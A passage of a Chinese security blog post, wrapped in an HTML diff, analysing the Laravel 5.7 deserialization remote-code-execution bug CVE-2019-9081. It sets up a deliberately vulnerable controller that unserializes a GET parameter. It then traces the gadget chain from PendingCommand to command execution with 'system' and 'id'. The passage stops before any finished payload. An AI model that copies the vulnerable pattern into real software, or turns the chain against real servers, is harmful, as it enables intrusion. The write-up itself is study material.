@@ -1,0 +1,921 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/toux.jpg?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/toux.jpg?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/toux.jpg?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/toux.jpg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="PHP,代码审计,Laravel,RCE,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="peri0d的博客" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="环境搭建 Laravel 5.7 文档 : https://learnku.com/docs/laravel/5.7/installation/2242  Composer 下载 : wget https://getcomposer.org/download/1.8.6/composer.phar 获取 composer.phar  参照 https://www.jianshu.com/p/438">
+<meta name="keywords" content="PHP,代码审计,Laravel,RCE">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Laravel 5.7 RCE (CVE-2019-9081)">
+<meta property="og:url" content="http://yoursite.com/2019/08/10/Laravel 5.7 RCE/index.html">
+<meta property="og:site_name" content="peri0d的博客">
+<meta property="og:description" content="环境搭建 Laravel 5.7 文档 : https://learnku.com/docs/laravel/5.7/installation/2242  Composer 下载 : wget https://getcomposer.org/download/1.8.6/composer.phar 获取 composer.phar  参照 https://www.jianshu.com/p/438">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-08-10T09:30:06.267Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Laravel 5.7 RCE (CVE-2019-9081)">
+<meta name="twitter:description" content="环境搭建 Laravel 5.7 文档 : https://learnku.com/docs/laravel/5.7/installation/2242  Composer 下载 : wget https://getcomposer.org/download/1.8.6/composer.phar 获取 composer.phar  参照 https://www.jianshu.com/p/438">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/08/10/Laravel 5.7 RCE/">
+
+
+
+
+
+  <title>Laravel 5.7 RCE (CVE-2019-9081) | peri0d的博客</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">peri0d的博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">peri0d</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/10/Laravel 5.7 RCE/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="peri0d">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/toux.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="peri0d的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Laravel 5.7 RCE (CVE-2019-9081)</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-08-10T17:34:01+08:00">
+                2019-08-10
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/代码审计/" itemprop="url" rel="index">
+                    <span itemprop="name">代码审计</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><ul>
+<li><p>Laravel 5.7 文档 : <a href="https://learnku.com/docs/laravel/5.7/installation/2242" target="_blank" rel="noopener">https://learnku.com/docs/laravel/5.7/installation/2242</a></p>
+</li>
+<li><p>Composer 下载 : <code>wget https://getcomposer.org/download/1.8.6/composer.phar</code> 获取 composer.phar</p>
+</li>
+<li><p>参照 <a href="https://www.jianshu.com/p/438a95046403" target="_blank" rel="noopener">https://www.jianshu.com/p/438a95046403</a> 安装 Composer 和 Laravel</p>
+</li>
+<li><p><code>composer create-project laravel/laravel laravel57 &quot;5.7.*&quot;</code> 安装 Laravel 5.7 并生成 <code>laravel57</code> 项目</p>
+</li>
+<li><p>进入项目文件夹，使用 <code>php artisan serve</code> 启动 web 服务</p>
+</li>
+<li><p>在 <code>laravel57/routes/web.php</code> 文件添加路由</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Route::get(<span class="string">"/"</span>,<span class="string">"\App\Http\Controllers\DemoController@demo"</span>);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>在 <code>laravel57/app/Http/Controllers/</code> 下添加 <code>DemoController</code> 控制器</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DemoController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">demo</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">            $code = $_GET[<span class="string">'c'</span>];</span><br><span class="line">            unserialize($code);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"peri0d"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">     </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h1 id="Laravel-项目文件夹结构"><a href="#Laravel-项目文件夹结构" class="headerlink" title="Laravel 项目文件夹结构"></a>Laravel 项目文件夹结构</h1><ul>
+<li>app : 包含了应用的核心代码<ul>
+<li>Broadcasting : 包含应用程序的所有广播频道类，默认不存在</li>
+<li>Console : 包含了所有自定义的 Artisan 命令</li>
+<li>Events : 存放了 事件类。可以使用事件来提醒应用其他部分发生了特定的操作，使应用程序更加的灵活和解耦。默认不存在</li>
+<li>Exceptions : 包含了应用的异常处理器，也是应用抛出异常的好地方</li>
+<li>Http : 包含了控制器、中间件和表单请求。几乎所有的进入应用的请求的处理逻辑都被放在这里</li>
+<li>Jobs : 存放了应用中的 队列任务 。 应用的任务可以被推送到队列或者在当前请求的生命周期内同步运行。在当前请求期间同步运行的任务可以看做是一个「命令」，因为它们是 命令模式 的实现。默认不存在</li>
+<li>Listeners : 包含了用来处理 事件 的类。事件监听器接收事件实例并执行响应该事件被触发的逻辑。默认不存在</li>
+<li>Mail : 包含应用所有的邮件发送类。默认不存在</li>
+<li>Notifications : 包含应用发送的所有「业务性」通知，比如关于在应用中发生的事件的简单通知。默认不存在</li>
+<li>Policies : 包含了应用的授权策略类。策略可以用来决定一个用户是否有权限去操作指定资源。默认不存在</li>
+<li>Providers : 包含应用的所有服务提供者。服务提供者通过在服务容器中绑定服务、注册事件、以及执行其他任务来为即将到来的请求做准备来启动应用。</li>
+<li>Rules : 包含应用自定义验证规则对象。这些规则意在将复杂的验证逻辑封装在一个简单的对象中。默认不存在</li>
+</ul>
+</li>
+<li>bootstrap : 包含启动框架的 <code>app.php</code> ，还包含 <code>cache</code> 目录，其下存放框架生成的用来提升性能的文件，比如路由和服务缓存文件</li>
+<li>config : 包含应用程序所有的配置文件</li>
+<li>database : 包含数据填充和迁移文件以及模型工厂类</li>
+<li>public : 包含入口文件 <code>index.php</code>，它是进入应用程序的所有请求的入口点。还包含一些资源文件，比如图片、JS 和 CSS</li>
+<li>resources : 包含了视图和未编译的资源文件(如 LESS、SASS 或 JavaScript )。此目录还包含所有的语言文件</li>
+<li>routes : 包含了应用的所有路由定义</li>
+<li>storage : 包含编译后的 Blade 模板、session 会话生成的文件、缓存文件以及框架生成的其他文件</li>
+<li>tests : 包含自动化测试文件</li>
+<li>vendor : 包含所有的 Composer 依赖包，其中也包含了 Laravel 源码</li>
+</ul>
+<h1 id="第一种漏洞分析"><a href="#第一种漏洞分析" class="headerlink" title="第一种漏洞分析"></a>第一种漏洞分析</h1><ul>
+<li><p>漏洞触发点位于 <code>Illuminate/Foundation/Testing/PendingCommand.php</code> 中的 <code>run</code> 方法，该文件的功能就是命令执行并获取输出，<code>PendingCommand.php</code> 又定义了 <code>__destruct()</code> 方法，思路就是构造 payload 触发 <code>__destruct()</code> 方法进而调用 <code>run</code> 方法实现 rce</p>
+</li>
+<li><p>根据已有的 exp 来看，<code>PendingCommand</code> 类的属性如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;app;         <span class="comment">// 一个实例化的类 Illuminate\Foundation\Application</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;test;        <span class="comment">// 一个实例化的类 Illuminate\Auth\GenericUser</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;command;     <span class="comment">// 要执行的php函数 system</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;parameters;  <span class="comment">// 要执行的php函数的参数  array('id')</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>在 <code>unserialize($code)</code> 处下断点调试，观察调用栈，发现有几个加载函数，<code>spl_autoload_call()</code> 、<code>Illuminate\Foundation\AliasLoader-&gt;load()</code> 、<code>Composer\Autoload\ClassLoader-&gt;loadClass()</code> 、<code>Composer\Autoload\includeFile()</code> 。</p>
+</li>
+<li><p>在加载完所需要的类后，会进入 <code>PendingCommand</code> 类的 <code>__destruct()</code> 方法。由于 <code>hasExecuted</code> 默认是 <code>false</code>，所以会去执行 <code>run()</code> 函数，<code>run()</code> 函数会在第 8 行执行命令，其代码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;hasExecuted = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;mockConsoleOutput();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        $exitCode = <span class="keyword">$this</span>-&gt;app[Kernel::class]-&gt;call(<span class="keyword">$this</span>-&gt;command, <span class="keyword">$this</span>-&gt;parameters);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoMatchingExpectationException $e) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($e-&gt;getMethodName() === <span class="string">'askQuestion'</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;test-&gt;fail(<span class="string">'Unexpected question "'</span>.$e-&gt;getActualArguments()[<span class="number">0</span>]-&gt;getQuestion().<span class="string">'" was asked.'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">throw</span> $e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>run()</code> 中首先执行了 <code>mockConsoleOutput()</code> ，该函数主要功能就是模拟控制台输出，此时又会加载一些所需要的类。代码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">mockConsoleOutput</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $mock = Mockery::mock(OutputStyle::class.<span class="string">'[askQuestion]'</span>, [(<span class="keyword">new</span> ArrayInput(<span class="keyword">$this</span>-&gt;parameters)), <span class="keyword">$this</span>-&gt;createABufferedOutputMock(),]);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;test-&gt;expectedQuestions <span class="keyword">as</span> $i =&gt; $question) &#123;</span><br><span class="line">        $mock-&gt;shouldReceive(<span class="string">'askQuestion'</span>)</span><br><span class="line">            -&gt;once()</span><br><span class="line">            -&gt;ordered()</span><br><span class="line">            -&gt;with(Mockery::on(<span class="function"><span class="keyword">function</span> <span class="params">($argument)</span> <span class="title">use</span> <span class="params">($question)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> $argument-&gt;getQuestion() == $question[<span class="number">0</span>];</span><br><span class="line">            &#125;))</span><br><span class="line">            -&gt;andReturnUsing(<span class="function"><span class="keyword">function</span> <span class="params">()</span> <span class="title">use</span> <span class="params">($question, $i)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;test-&gt;expectedQuestions[$i]);</span><br><span class="line">                <span class="keyword">return</span> $question[<span class="number">1</span>];</span><br><span class="line">            &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;app-&gt;bind(OutputStyle::class, <span class="function"><span class="keyword">function</span> <span class="params">()</span> <span class="title">use</span> <span class="params">($mock)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $mock;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+<ul>
+<li><p><code>mockConsoleOutput()</code> 中又调用了 <code>createABufferedOutputMock()</code> 。在 <code>createABufferedOutputMock()</code> 函数中，首先调用 <code>mock()</code> 函数，它的作用主要是进行对象模拟。然后进入循环，要遍历 <code>$this-&gt;test</code> 类的 <code>expectedOutput</code> 属性，但是在可以实例化的类中不存在这个属性。当访问一个类中不存在的属性时会触发 <code>__get()</code> ，通过去触发 <code>__get()</code> 方法去进一步构造 pop 链。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">createABufferedOutputMock</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $mock = Mockery::mock(BufferedOutput::class.<span class="string">'[doWrite]'</span>)</span><br><span class="line">        -&gt;shouldAllowMockingProtectedMethods()</span><br><span class="line">        -&gt;shouldIgnoreMissing();</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;test-&gt;expectedOutput <span class="keyword">as</span> $i =&gt; $output) &#123;</span><br><span class="line">        $mock-&gt;shouldReceive(<span class="string">'doWrite'</span>)</span><br><span class="line">            -&gt;once()</span><br><span class="line">            -&gt;ordered()</span><br><span class="line">            -&gt;with($output, Mockery::any())</span><br><span class="line">            -&gt;andReturnUsing(<span class="function"><span class="keyword">function</span> <span class="params">()</span> <span class="title">use</span> <span class="params">($i)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;test-&gt;expectedOutput[$i]);</span><br><span class="line">            &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $mock;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>这里选择 <code>Illuminate\Auth\GenericUser</code>，其 <code>__get()</code> 魔术方法如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;attributes[$key];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>此时 <code>$this-&gt;test</code> 是我们传入的 <code>Illuminate\Auth\GenericUser</code> 的实例化对象，则 <code>$this-&gt;attributes[$key]</code> 通过反序列化是可控的，因此我们可以构造<code>$this-&gt;attributes</code>键名为<code>expectedOutput</code>的数组。这样一来<code>$this-&gt;test-&gt;expectedOutput</code>就会返回<code>$this-&gt;attributes</code>中键名为<code>expectedOutput</code>的数组</p>
+</li>
+<li><p>回到 <code>mockConsoleOutput()</code> 中，又进行了一次 for 循环，调用了 <code>$this-&gt;test-&gt;expectedQuestions</code> ，循环体与 <code>createABufferedOutputMock()</code> 大致相同，所以可以构造 <code>$this-&gt;attributes</code>键名为<code>expectedQuestions</code>的数组绕过</p>
+</li>
+<li><p>然后就可以走出 <code>mockConsoleOutput()</code> 方法，进入命令执行的关键点 <code>$exitCode = $this-&gt;app[Kernel::class]-&gt;call($this-&gt;command, $this-&gt;parameters);</code> ，这里 <code>Kernel::class</code> 是个固定值，为 <code>Illuminate\Contracts\Console\Kernel</code> ，这里需要搞清楚 <code>$this-&gt;app[Kernel::class]</code> ，可以得到如下的函数调用顺序</p>
+<ul>
+<li><p>Container.php:1222, Illuminate\Foundation\Application-&gt;offsetGet()</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// key = Illuminate\Contracts\Console\Kernel</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">offsetGet</span><span class="params">($key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;make($key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Application.php:751, Illuminate\Foundation\Application-&gt;make()</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// abstract = Illuminate\Contracts\Console\Kernel</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">make</span><span class="params">($abstract, array $parameters = [])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $abstract = <span class="keyword">$this</span>-&gt;getAlias($abstract);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;deferredServices[$abstract]) &amp;&amp; ! <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;instances[$abstract])) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;loadDeferredProvider($abstract);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">parent</span>::make($abstract, $parameters);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Container.php:609, Illuminate\Foundation\Application-&gt;make()</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// abstract = Illuminate\Contracts\Console\Kernel</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">make</span><span class="params">($abstract, array $parameters = [])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resolve($abstract, $parameters);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Container.php:652, Illuminate\Foundation\Application-&gt;resolve()</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// abstract = Illuminate\Contracts\Console\Kernel</span></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">resolve</span><span class="params">($abstract, $parameters = [])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $abstract = <span class="keyword">$this</span>-&gt;getAlias($abstract);</span><br><span class="line">    $needsContextualBuild = ! <span class="keyword">empty</span>($parameters) || ! is_null(<span class="keyword">$this</span>-&gt;getContextualConcrete($abstract));</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;instances[$abstract]) &amp;&amp; ! $needsContextualBuild) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;instances[$abstract];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;with[] = $parameters;</span><br><span class="line">    $concrete = <span class="keyword">$this</span>-&gt;getConcrete($abstract);</span><br><span class="line">    <span class="comment">// concrete = Illuminate\Foundation\Application</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;isBuildable($concrete, $abstract)) &#123;</span><br><span class="line">        $object = <span class="keyword">$this</span>-&gt;build($concrete);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $object = <span class="keyword">$this</span>-&gt;make($concrete);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;getExtenders($abstract) <span class="keyword">as</span> $extender) &#123;</span><br><span class="line">        $object = $extender($object, <span class="keyword">$this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;isShared($abstract) &amp;&amp; ! $needsContextualBuild) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;instances[$abstract] = $object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;fireResolvingCallbacks($abstract, $object);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;resolved[$abstract] = <span class="keyword">true</span>;</span><br><span class="line">    array_pop(<span class="keyword">$this</span>-&gt;with);</span><br><span class="line">    <span class="keyword">return</span> $object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Container.php:697, Illuminate\Foundation\Application-&gt;getConcrete()</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// abstract = Illuminate\Contracts\Console\Kernel</span></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getConcrete</span><span class="params">($abstract)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (! is_null($concrete = <span class="keyword">$this</span>-&gt;getContextualConcrete($abstract))) &#123;</span><br><span class="line">        <span class="keyword">return</span> $concrete;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;bindings[$abstract])) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;bindings[$abstract][<span class="string">'concrete'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $abstract;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
